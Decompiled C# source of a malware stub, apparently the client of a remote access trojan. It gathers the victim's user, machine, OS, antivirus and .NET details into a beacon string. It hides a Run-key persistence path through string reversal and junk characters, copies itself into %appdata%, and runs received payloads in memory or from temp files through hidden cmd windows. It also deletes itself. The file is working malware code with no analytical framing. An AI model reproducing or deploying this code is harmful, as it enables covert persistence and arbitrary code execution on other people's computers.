using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Stub;

internal static class Helper
{
	private static string Version = "[D] v0.9.1";

	private static string Nick = "explorer";

	private const string SPL = "<#!#>";

	public static string inN = "dx";

	private static string installPath = "%appdata%";

	public static string Info()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append("info<#!#>");
		stringBuilder.Append(Nick + "<#!#>");
		stringBuilder.Append(Environment.UserName + "@" + Environment.MachineName + "<#!#>");
		stringBuilder.Append(Pc() + "<#!#>");
		stringBuilder.Append(AV() + "<#!#>");
		stringBuilder.Append(dotNet() + "<#!#>");
		stringBuilder.Append(Version + "<#!#>");
		return stringBuilder.ToString();
	}

	private static string Pc()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		string? text = ((ManagementBaseObject)((IEnumerable)new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get()).Cast<ManagementObject>().FirstOrDefault()).get_Properties().get_Item("Caption").get_Value()
			.ToString();
		return string.Concat(str1: (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))) ? " X64 " : " X32 ", str0: text!.ToString().Replace("Microsoft ", "").Replace("Windows ", "WIN_")).Replace("Home ", "").Replace("Pro ", "");
	}

	private static string AV()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		try
		{
			bool flag = false;
			ManagementObjectCollection obj = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get();
			text = "";
			ManagementObjectEnumerator enumerator = obj.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					if (current.GetPropertyValue("displayName").ToString()!.Equals("Windows Defender"))
					{
						flag = true;
					}
					if (current.GetPropertyValue("displayName").ToString() != "Windows Defender")
					{
						text = current.GetPropertyValue("displayName").ToString();
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (text.Equals(string.Empty) && flag)
			{
				text = "Windows Defender";
			}
			if (text == "")
			{
				return "N/A";
			}
			return text;
		}
		catch (Exception)
		{
			return "N/A";
		}
	}

	private static string dotNet()
	{
		string text = "";
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\Microsoft.NET\\Framework\\v2.0.50727"))
		{
			text += "v2.0";
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\Microsoft.NET\\Framework\\v4.0.30319"))
		{
			text += " v4.0";
		}
		if (!(text == ""))
		{
			return text;
		}
		return "N/A";
	}

	public static void Uninstall()
	{
		if (!inN.Contains("install") && !inN.Contains("Name"))
		{
			try
			{
				Registry.CurrentUser.OpenSubKey(Reverse("nuR\\noisreKVtnerruC\\swodniW\\tfosKorciM\\ERAKWTFOS"), writable: true)!.DeleteValue(inN, throwOnMissingValue: false);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.Arguments = "/C timeout 1 & Del \"" + Environment.ExpandEnvironmentVariables(installPath) + "\\" + inN + ".exe\"";
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.FileName = "cmd.exe";
				Process.Start(processStartInfo);
			}
			catch
			{
			}
		}
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C timeout 1 & Del \"" + Assembly.GetExecutingAssembly().Location + "\"",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		Environment.Exit(0);
	}

	public static void Install()
	{
		new Task(delegate
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, Environment.ExpandEnvironmentVariables(installPath) + "\\" + inN + ".exe");
			Registry.CurrentUser.OpenSubKey(Reverse("nuR\\noisreKVtnerruC\\swodniW\\tfosKorciM\\ERAKWTFOS"), writable: true)!.SetValue(inN, Environment.ExpandEnvironmentVariables(installPath) + "\\" + inN + ".exe");
		}).Start();
	}

	public static void Restart()
	{
		new Task(delegate
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C timeout 2 & \"" + Assembly.GetExecutingAssembly().Location + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Environment.Exit(0);
		}).Start();
	}

	public static bool Run(byte[] bytes, string args, string ex = null)
	{
		try
		{
			switch (args)
			{
			case "memory":
			{
				Assembly assembly = AppDomain.CurrentDomain.Load(bytes);
				MethodInfo entryPoint = assembly.EntryPoint;
				object obj = assembly.CreateInstance(entryPoint.Name);
				object[] array = new string[1];
				object[] parameters = array;
				if (entryPoint.GetParameters().Length == 0)
				{
					parameters = null;
				}
				entryPoint.Invoke(obj, parameters);
				break;
			}
			case "update":
			{
				string text2 = Path.GetTempFileName() + ex;
				File.WriteAllBytes(text2, bytes);
				using (Process process2 = new Process())
				{
					process2.StartInfo.Arguments = "/C timeout 2 && \"" + text2 + "\"";
					process2.StartInfo.FileName = "cmd.exe";
					process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process2.StartInfo.CreateNoWindow = true;
					process2.Start();
				}
				Uninstall();
				break;
			}
			case "disk":
			{
				string text = Path.GetTempFileName() + ex;
				File.WriteAllBytes(text, bytes);
				using (Process process = new Process())
				{
					process.StartInfo.Arguments = "/c \"" + text + "\"";
					process.StartInfo.FileName = "cmd.exe";
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.StartInfo.CreateNoWindow = true;
					process.Start();
				}
				break;
			}
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static string Reverse(string s)
	{
		s = s.Replace("K", "");
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}
}
